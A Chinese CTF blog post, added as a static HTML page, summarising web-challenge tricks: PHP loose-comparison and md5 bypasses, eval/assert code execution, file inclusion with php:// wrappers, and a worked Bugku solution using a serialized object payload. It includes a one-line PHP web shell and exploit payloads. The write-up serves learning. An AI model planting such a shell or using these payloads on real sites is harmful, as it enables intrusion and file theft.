@@ -1,0 +1,825 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="总结,技巧,">
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="peri0d的博客" type="application/atom+xml">
+
+
+
+
+
+
+<meta name="description" content="最近也做了很多web的CTF题目，做一个小总结吧，以后继续更新。 一、常识1.看到网站，先御剑扫描一波，robots.txt等文件 2.F12经常打开看一看，看注释，看网络，看存储 3.不要忘记burp 二、PHP弱类型1.在PHP里面    ==   比较指比较值，不同类型会转换成同一类型比较。用   ===   比较时，必须值和类型都一样才为true 2.bool类型的true跟任意字符串都可">
+<meta name="keywords" content="总结,技巧">
+<meta property="og:type" content="article">
+<meta property="og:title" content="总结">
+<meta property="og:url" content="http://yoursite.com/2019/06/01/一些总结/index.html">
+<meta property="og:site_name" content="peri0d的博客">
+<meta property="og:description" content="最近也做了很多web的CTF题目，做一个小总结吧，以后继续更新。 一、常识1.看到网站，先御剑扫描一波，robots.txt等文件 2.F12经常打开看一看，看注释，看网络，看存储 3.不要忘记burp 二、PHP弱类型1.在PHP里面    ==   比较指比较值，不同类型会转换成同一类型比较。用   ===   比较时，必须值和类型都一样才为true 2.bool类型的true跟任意字符串都可">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/bugku/bugku_wel2bugku_1.PNG">
+<meta property="og:image" content="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/bugku/bugku_wel2bugku_2.PNG">
+<meta property="og:image" content="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/bugku/bugku_wel2bugku_3.PNG">
+<meta property="og:updated_time" content="2019-05-31T18:31:45.248Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="总结">
+<meta name="twitter:description" content="最近也做了很多web的CTF题目，做一个小总结吧，以后继续更新。 一、常识1.看到网站，先御剑扫描一波，robots.txt等文件 2.F12经常打开看一看，看注释，看网络，看存储 3.不要忘记burp 二、PHP弱类型1.在PHP里面    ==   比较指比较值，不同类型会转换成同一类型比较。用   ===   比较时，必须值和类型都一样才为true 2.bool类型的true跟任意字符串都可">
+<meta name="twitter:image" content="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/bugku/bugku_wel2bugku_1.PNG">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/06/01/一些总结/">
+
+
+
+
+
+  <title>总结 | peri0d的博客</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">peri0d的博客</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">peri0d</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-commonweal">
+          <a href="/404/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-heartbeat"></i> <br>
+            
+            公益404
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/06/01/一些总结/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="peri0d">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/toux.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="peri0d的博客">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">总结</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-06-01T02:37:38+08:00">
+                2019-06-01
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/总结/" itemprop="url" rel="index">
+                    <span itemprop="name">总结</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>最近也做了很多web的CTF题目，做一个小总结吧，以后继续更新。</p>
+<h1 id="一、常识"><a href="#一、常识" class="headerlink" title="一、常识"></a>一、常识</h1><p>1.看到网站，先御剑扫描一波，robots.txt等文件</p>
+<p>2.F12经常打开看一看，看注释，看网络，看存储</p>
+<p>3.不要忘记burp</p>
+<h1 id="二、PHP弱类型"><a href="#二、PHP弱类型" class="headerlink" title="二、PHP弱类型"></a>二、PHP弱类型</h1><p>1.在PHP里面    ==   比较指比较值，不同类型会转换成同一类型比较。用   ===   比较时，必须值和类型都一样才为true</p>
+<p>2.bool类型的true跟任意字符串都可以弱类型相等</p>
+<p>3.PHP支持引用赋值，使用” $var = &amp;$othervar; “语法。引用赋值意味着两个变量指向了同一个数据，没有拷贝任何东西，$var和$othervar就永远相等了，一般用在序列化中</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">var_dump(<span class="string">'a'</span> == <span class="number">0</span>)  <span class="comment">//true，a会被转化为数字0</span></span><br><span class="line">var_dump(<span class="string">'1234a'</span> == <span class="number">1234</span>)  <span class="comment">//true，这里'1234a'会被转化为1234</span></span><br><span class="line"><span class="comment">//在$a==$b的比较中</span></span><br><span class="line">$a=<span class="string">''</span>; $b=<span class="keyword">null</span>        <span class="comment">//true</span></span><br><span class="line">$a=<span class="keyword">null</span>; $b=<span class="keyword">true</span>      <span class="comment">//true</span></span><br><span class="line">$a=<span class="number">0</span>; $b=<span class="string">'0'</span>       <span class="comment">//true</span></span><br><span class="line">$a=<span class="number">0</span>; $b=<span class="string">'abcdef'</span>  <span class="comment">//true  而 0==='abcdef' false</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="三、hash比较缺陷"><a href="#三、hash比较缺陷" class="headerlink" title="三、hash比较缺陷"></a>三、hash比较缺陷</h1><p>1.md5弱比较，以 0e 开头的会被识别为科学计数法，结果均为 0</p>
+<p>2.md5强比较，传入数组绕过</p>
+<p>3.基于全等的MD5碰撞绕过</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//弱比较  param1=QNKCDZO&amp;param2=s155964671a</span></span><br><span class="line"><span class="keyword">if</span>(( $_POST[<span class="string">'param1'</span>]) != ($_POST[<span class="string">'param2'</span>]) &amp;&amp; md5($_POST[<span class="string">'param1'</span>]) == md5($_POST[<span class="string">'param2'</span>])) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">"success !"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//强比较，参数没有强制转化为字符串  param1[]=11&amp;param2[]=22</span></span><br><span class="line"><span class="keyword">if</span>(( $_POST[<span class="string">'param1'</span>]) !== ($_POST[<span class="string">'param2'</span>]) &amp;&amp; md5($_POST[<span class="string">'param1'</span>]) === md5($_POST[<span class="string">'param2'</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"success !"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//基于全等的MD5碰撞  fastcoll，tail生成md5相同的文件</span></span><br><span class="line"><span class="comment">//https://peri0d.xyz/2019/04/23/JACTF-Web%E9%83%A8%E5%88%86.html</span></span><br><span class="line"><span class="keyword">if</span>((string)( $_POST[<span class="string">'param1'</span>]) !== (string)($_POST[<span class="string">'param2'</span>]) &amp;&amp; md5($_POST[<span class="string">'param1'</span>]) === md5($_POST[<span class="string">'param2'</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"success !"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="四、任意代码-任意命令执行"><a href="#四、任意代码-任意命令执行" class="headerlink" title="四、任意代码/任意命令执行"></a>四、任意代码/任意命令执行</h1><p>1.create_function()注入</p>
+<p>2.eval()函数</p>
+<p>3.assert()函数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//create_function() </span></span><br><span class="line"><span class="comment">//from JACTF-not easy</span></span><br><span class="line"><span class="comment">//https://peri0d.xyz/2019/04/23/JACTF-Web%E9%83%A8%E5%88%86.html</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$newfunc = create_function(<span class="string">'$a,$b'</span>, <span class="string">'return "ln($a) + ln($b) = " . log($a * $b);'</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"New anonymous function: $newfunc\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> $newfunc(<span class="number">2</span>, M_E) . <span class="string">"\n"</span>;</span><br><span class="line"><span class="comment">// outputs</span></span><br><span class="line"><span class="comment">// New anonymous function: lambda_1</span></span><br><span class="line"><span class="comment">// ln(2) + ln(2.718281828459) = 1.6931471805599</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">第一行代码等价于</span><br><span class="line"><span class="keyword">eval</span>(</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__lambda_func</span><span class="params">($a, $b)</span></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="string">"ln($a) + ln($b) = "</span> . log($a * $b); </span><br><span class="line">&#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+
+<p>eval与assert都算是元老级一句话后门函数</p>
+<p>eval函数中参数是字符，如：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_POST[<span class="string">'shell'</span>]);<span class="meta">?&gt;</span> <span class="comment">//一句话</span></span><br><span class="line"><span class="keyword">eval</span>(<span class="string">'echo 1;'</span>);</span><br></pre></td></tr></table></figure>
+
+<p>assert函数中参数为表达式 （或者为函数），如：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">assert(phpinfo());</span><br><span class="line">assert(<span class="keyword">eval</span>(<span class="string">'echo 1;'</span>));</span><br></pre></td></tr></table></figure>
+
+<h1 id="五、文件包含-LFI"><a href="#五、文件包含-LFI" class="headerlink" title="五、文件包含(LFI)"></a>五、文件包含(LFI)</h1><p>1.php脚本使用了include，include_once，require，require_once这四个函数，并且函数的参数是用户可控的</p>
+<p>2.通常include函数中，包含文件的后缀名时被限制的，如果php版本小于等于5.3，则可以%00截断</p>
+<p>3.php伪协议助阵LFI</p>
+<h1 id="六、序列化与反序列化"><a href="#六、序列化与反序列化" class="headerlink" title="六、序列化与反序列化"></a>六、序列化与反序列化</h1><p>1.__wakeup()</p>
+<p>2.引用赋值，永远相等</p>
+<p>ciscn2019—Justsooso</p>
+<p>没有放到我的博客上</p>
+<p>文档：JustSoso.note<br>链接：<a href="http://note.youdao.com/noteshare?id=dfeffdf87a2fcd81fe43f3f9bcd799c1" target="_blank" rel="noopener">http://note.youdao.com/noteshare?id=dfeffdf87a2fcd81fe43f3f9bcd799c1</a></p>
+<h1 id="七、一个例子"><a href="#七、一个例子" class="headerlink" title="七、一个例子"></a>七、一个例子</h1><p>放一个题目，结合了<strong>文件包含</strong>和<strong>反序列化</strong></p>
+<p>地址：<a href="http://123.206.87.240:8006/test1/" target="_blank" rel="noopener">http://123.206.87.240:8006/test1/</a></p>
+<p>给了一个不完整的index.php代码</p>
+<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/bugku/bugku_wel2bugku_1.PNG" alt></p>
+<p><strong>思路：</strong></p>
+<p>isset($user)：user不能为空</p>
+<p>file_get_contents($user,’r’)：将user文件的内容读入一个字符串中</p>
+<p>很明显，user是一个文件，让这个字符串完全等于”welcome to the bugkuctf”——————-&gt;php伪协议php://input</p>
+<p>hint.php：满足所有条件之后读取hint.php文件————————&gt;php://filter</p>
+<p>payload:</p>
+<p>txt=php://input&amp;file=php://filter/read=convert.base64-encode/resource=hint.php</p>
+<p>利用伪协议获得目标文件的base64密文</p>
+<p>hint.php</p>
+<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/bugku/bugku_wel2bugku_2.PNG" alt></p>
+<p>在生成一个Flag类对象时，执行__tostring函数，输出文件内容，那么屏蔽的flag.php可以在此处打开</p>
+<p>index.php</p>
+<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/bugku/bugku_wel2bugku_3.PNG" alt></p>
+<p>发现如果file中包含flag就会退出，如果不包含flag就会把那个文件包含进来，再执行一次反序列化，输出password</p>
+<p>php序列化</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> $file;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> Flag();</span><br><span class="line">$a-&gt;file = <span class="string">"flag.php"</span>;</span><br><span class="line">$a = serialize($a);</span><br><span class="line">print_r($a);	</span><br><span class="line"></span><br><span class="line"><span class="comment">//$a = O:4:"Flag":1:&#123;s:4:"file";s:8:"flag.php";&#125;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>最终payload</strong></p>
+<p><a href="http://120.24.86.145:8006/test1/index.php?txt=php://input&amp;file=hint.php&amp;password=O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}" target="_blank" rel="noopener">http://120.24.86.145:8006/test1/index.php?txt=php://input&amp;file=hint.php&amp;password=O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}</a></p>
+<p>POST数据为welcome to the bugkuctf</p>
+<h1 id="八、我的一些想法"><a href="#八、我的一些想法" class="headerlink" title="八、我的一些想法"></a>八、我的一些想法</h1><p>对于web安全，我认为其本质就是fuzz，就是给一个输入根据输出判断代码的逻辑。通过fuzz来观察什么输入就正确的，什么输入是错误的，并根据返回的错误采用一些手段进行攻击。</p>
+<p>对于web安全的学习，我认为是一个逆向的过程，不是说要把所有的东西学完再去进行攻击，而是直接进行攻击，在攻击的过程中去学习。</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/总结/" rel="tag"># 总结</a>
+          
+            <a href="/tags/技巧/" rel="tag"># 技巧</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/06/01/蓝鲸打卡Web分析/" rel="next" title="蓝鲸安全打卡Web分析">
+                <i class="fa fa-chevron-left"></i> 蓝鲸安全打卡Web分析
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/toux.jpg" alt="peri0d">
+            
+              <p class="site-author-name" itemprop="name">peri0d</p>
+              <p class="site-description motion-element" itemprop="description">待我尝尽世间甘苦，便喂你一勺甜。</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">6</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">2</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">6</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#一、常识"><span class="nav-number">1.</span> <span class="nav-text">一、常识</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#二、PHP弱类型"><span class="nav-number">2.</span> <span class="nav-text">二、PHP弱类型</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#三、hash比较缺陷"><span class="nav-number">3.</span> <span class="nav-text">三、hash比较缺陷</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#四、任意代码-任意命令执行"><span class="nav-number">4.</span> <span class="nav-text">四、任意代码/任意命令执行</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#五、文件包含-LFI"><span class="nav-number">5.</span> <span class="nav-text">五、文件包含(LFI)</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#六、序列化与反序列化"><span class="nav-number">6.</span> <span class="nav-text">六、序列化与反序列化</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#七、一个例子"><span class="nav-number">7.</span> <span class="nav-text">七、一个例子</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#八、我的一些想法"><span class="nav-number">8.</span> <span class="nav-text">八、我的一些想法</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">peri0d</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
